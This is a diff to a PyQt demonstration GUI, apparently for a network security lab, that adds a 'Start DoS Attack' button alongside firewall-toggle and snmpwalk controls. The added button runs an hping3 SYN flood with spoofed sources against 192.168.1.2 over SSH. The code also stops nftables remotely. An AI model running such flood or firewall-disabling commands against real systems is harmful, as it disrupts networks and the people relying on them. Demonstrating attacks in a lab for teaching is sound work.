@@ -19,6 +19,32 @@ class _SSHWorker(QThread):
         self.finished.emit(stdout, stderr, rc)
 
 
+class _BackgroundStartWorker(QThread):
+    finished = pyqtSignal(bool)  # success
+
+    def __init__(self, tunnel_manager, remote_cmd):
+        super().__init__()
+        self._tm = tunnel_manager
+        self._cmd = remote_cmd
+
+    def run(self):
+        ok = self._tm.start_background_command(self._cmd)
+        self.finished.emit(ok)
+
+
+class _BackgroundStopWorker(QThread):
+    finished = pyqtSignal()
+
+    def __init__(self, tunnel_manager, process_name):
+        super().__init__()
+        self._tm = tunnel_manager
+        self._name = process_name
+
+    def run(self):
+        self._tm.stop_background_command(self._name)
+        self.finished.emit()
+
+
 class _OutputDialog(QDialog):
     def __init__(self, title, text, parent=None):
         super().__init__(parent)
@@ -41,21 +67,47 @@ class _OutputDialog(QDialog):
         layout.addWidget(output)
 
         btns = QDialogButtonBox(QDialogButtonBox.Close)
-        btns.setStyleSheet("QPushButton { background-color: #EAAA00; color: #002855; font-weight: bold; padding: 6px 20px; }")
+        btns.setStyleSheet(
+            "QPushButton { background-color: #EAAA00; color: #002855;"
+            " font-weight: bold; padding: 6px 20px; }"
+        )
         btns.rejected.connect(self.accept)
         layout.addWidget(btns)
+
+
+_BTN_STYLE_NORMAL = (
+    "QPushButton {"
+    "  background-color: #EAAA00; color: #002855;"
+    "  font-size: 15px; font-weight: bold; border-radius: 6px;"
+    "}"
+    "QPushButton:hover { background-color: #ffc600; }"
+    "QPushButton:disabled { background-color: #555; color: #999; }"
+)
+
+_BTN_STYLE_DANGER = (
+    "QPushButton {"
+    "  background-color: #cc2200; color: white;"
+    "  font-size: 15px; font-weight: bold; border-radius: 6px;"
+    "}"
+    "QPushButton:hover { background-color: #ee3311; }"
+    "QPushButton:disabled { background-color: #555; color: #999; }"
+)
 
 
 class DemonstrationView(QWidget):
     def __init__(self, tunnel_manager=None, user=None):
         super().__init__()
         self._tm = tunnel_manager
-        self._firewall_enabled = True  # assumed enabled at startup; verified by _check_firewall
+        self._firewall_enabled = True   # verified asynchronously on startup
+        self._dos_running = False
         self._worker = None
         self._setup_ui()
-        # Check actual firewall state asynchronously so the UI is not blocked
-        self._run_async("systemctl is-active nftables", sudo=False,
-                        callback=self._on_firewall_check_done)
+        # Buttons stay disabled until the initial firewall state is confirmed
+        self._set_buttons_enabled(False)
+        self._run_async(
+            "systemctl is-active nftables", sudo=False,
+            callback=self._on_firewall_check_done,
+        )
 
     # ── UI setup ──────────────────────────────────────────────────────────────
 
@@ -76,14 +128,23 @@ class DemonstrationView(QWidget):
         self._fw_btn = QPushButton("Disable Firewall")
         self._fw_btn.setCursor(Qt.PointingHandCursor)
         self._fw_btn.setFixedSize(220, 50)
+        self._fw_btn.setStyleSheet(_BTN_STYLE_NORMAL)
         self._fw_btn.clicked.connect(self._on_fw_btn_clicked)
         btn_row.addWidget(self._fw_btn)
 
         self._snmp_btn = QPushButton("Run snmpwalk")
         self._snmp_btn.setCursor(Qt.PointingHandCursor)
         self._snmp_btn.setFixedSize(220, 50)
+        self._snmp_btn.setStyleSheet(_BTN_STYLE_NORMAL)
         self._snmp_btn.clicked.connect(self._on_snmp_btn_clicked)
         btn_row.addWidget(self._snmp_btn)
+
+        self._dos_btn = QPushButton("Start DoS Attack")
+        self._dos_btn.setCursor(Qt.PointingHandCursor)
+        self._dos_btn.setFixedSize(220, 50)
+        self._dos_btn.setStyleSheet(_BTN_STYLE_NORMAL)
+        self._dos_btn.clicked.connect(self._on_dos_btn_clicked)
+        btn_row.addWidget(self._dos_btn)
 
         outer.addLayout(btn_row)
 
@@ -91,25 +152,18 @@ class DemonstrationView(QWidget):
         self._status_label.setStyleSheet("font-size: 13px; color: #99aacc;")
         outer.addWidget(self._status_label)
 
-        self._apply_btn_style()
-
-    def _apply_btn_style(self):
-        style = (
-            "QPushButton {"
-            "  background-color: #EAAA00; color: #002855;"
-            "  font-size: 15px; font-weight: bold;"
-            "  border-radius: 6px;"
-            "}"
-            "QPushButton:hover { background-color: #ffc600; }"
-            "QPushButton:disabled { background-color: #555; color: #999; }"
-        )
-        self._fw_btn.setStyleSheet(style)
-        self._snmp_btn.setStyleSheet(style)
-
     def _update_fw_button(self):
         self._fw_btn.setText("Disable Firewall" if self._firewall_enabled else "Enable Firewall")
 
-    # ── Async helper ──────────────────────────────────────────────────────────
+    def _update_dos_button(self):
+        if self._dos_running:
+            self._dos_btn.setText("Stop DoS Attack")
+            self._dos_btn.setStyleSheet(_BTN_STYLE_DANGER)
+        else:
+            self._dos_btn.setText("Start DoS Attack")
+            self._dos_btn.setStyleSheet(_BTN_STYLE_NORMAL)
+
+    # ── Async helpers ─────────────────────────────────────────────────────────
 
     def _run_async(self, remote_cmd, sudo, callback):
         if self._tm is None:
@@ -117,7 +171,26 @@ class DemonstrationView(QWidget):
             return
         worker = _SSHWorker(self._tm, remote_cmd, sudo=sudo)
         worker.finished.connect(callback)
-        # Keep a reference so the thread isn't garbage-collected mid-run
+        worker.finished.connect(lambda *_: self._cleanup_worker(worker))
+        self._worker = worker
+        worker.start()
+
+    def _run_background_start(self, remote_cmd, callback):
+        if self._tm is None:
+            callback(False)
+            return
+        worker = _BackgroundStartWorker(self._tm, remote_cmd)
+        worker.finished.connect(callback)
+        worker.finished.connect(lambda *_: self._cleanup_worker(worker))
+        self._worker = worker
+        worker.start()
+
+    def _run_background_stop(self, process_name, callback):
+        if self._tm is None:
+            callback()
+            return
+        worker = _BackgroundStopWorker(self._tm, process_name)
+        worker.finished.connect(callback)
         worker.finished.connect(lambda *_: self._cleanup_worker(worker))
         self._worker = worker
         worker.start()
@@ -131,24 +204,24 @@ class DemonstrationView(QWidget):
     def _set_buttons_enabled(self, enabled):
         self._fw_btn.setEnabled(enabled)
         self._snmp_btn.setEnabled(enabled)
+        self._dos_btn.setEnabled(enabled)
 
     # ── Firewall check (startup) ──────────────────────────────────────────────
 
     def _on_firewall_check_done(self, stdout, stderr, rc):
-        # rc == 0 means "active"
         self._firewall_enabled = (rc == 0)
         self._update_fw_button()
+        self._set_buttons_enabled(True)
 
     # ── Firewall toggle ───────────────────────────────────────────────────────
 
     def _on_fw_btn_clicked(self):
         self._set_buttons_enabled(False)
         if self._firewall_enabled:
-            cmd = "systemctl stop nftables"
-            self._status_label.setText("Disabling firewall…")
+            cmd, msg = "systemctl stop nftables", "Disabling firewall…"
         else:
-            cmd = "systemctl start nftables"
-            self._status_label.setText("Enabling firewall…")
+            cmd, msg = "systemctl start nftables", "Enabling firewall…"
+        self._status_label.setText(msg)
         self._run_async(cmd, sudo=True, callback=self._on_fw_toggle_done)
 
     def _on_fw_toggle_done(self, stdout, stderr, rc):
@@ -159,8 +232,7 @@ class DemonstrationView(QWidget):
             state = "enabled" if self._firewall_enabled else "disabled"
             self._status_label.setText(f"Firewall {state}.")
         else:
-            msg = stderr or stdout or "Unknown error"
-            self._status_label.setText(f"Error: {msg}")
+            self._status_label.setText(f"Error: {stderr or stdout or 'Unknown error'}")
 
     # ── snmpwalk ──────────────────────────────────────────────────────────────
 
@@ -180,10 +252,44 @@ class DemonstrationView(QWidget):
         dlg = _OutputDialog("snmpwalk output", output, parent=self)
         dlg.exec_()
 
-    # ── Called by MainWindow.closeEvent to restore firewall ───────────────────
+    # ── DoS attack ────────────────────────────────────────────────────────────
+
+    def _on_dos_btn_clicked(self):
+        self._set_buttons_enabled(False)
+        if not self._dos_running:
+            self._status_label.setText("Starting DoS attack…")
+            self._run_background_start(
+                "sudo hping3 -I wlan0 -S -d 1000 -q --flood --rand-source 192.168.1.2",
+                callback=self._on_dos_started,
+            )
+        else:
+            self._status_label.setText("Stopping DoS attack…")
+            self._run_background_stop("hping3", callback=self._on_dos_stopped)
+
+    def _on_dos_started(self, success):
+        self._dos_running = success
+        self._update_dos_button()
+        self._set_buttons_enabled(True)
+        self._status_label.setText(
+            "DoS attack running." if success else "Failed to start DoS attack."
+        )
+
+    def _on_dos_stopped(self):
+        self._dos_running = False
+        self._update_dos_button()
+        self._set_buttons_enabled(True)
+        self._status_label.setText("DoS attack stopped.")
+
+    # ── Called by MainWindow.closeEvent ──────────────────────────────────────
 
     def ensure_firewall_enabled(self):
-        """Synchronously re-enable the firewall if it was disabled. Blocks briefly."""
+        """Synchronously re-enable the firewall if it was disabled."""
         if not self._firewall_enabled and self._tm is not None:
             self._tm.run_command("systemctl start nftables", sudo=True)
             self._firewall_enabled = True
+
+    def ensure_dos_stopped(self):
+        """Synchronously stop the DoS attack if it is still running."""
+        if self._dos_running and self._tm is not None:
+            self._tm.stop_background_command("hping3")
+            self._dos_running = False
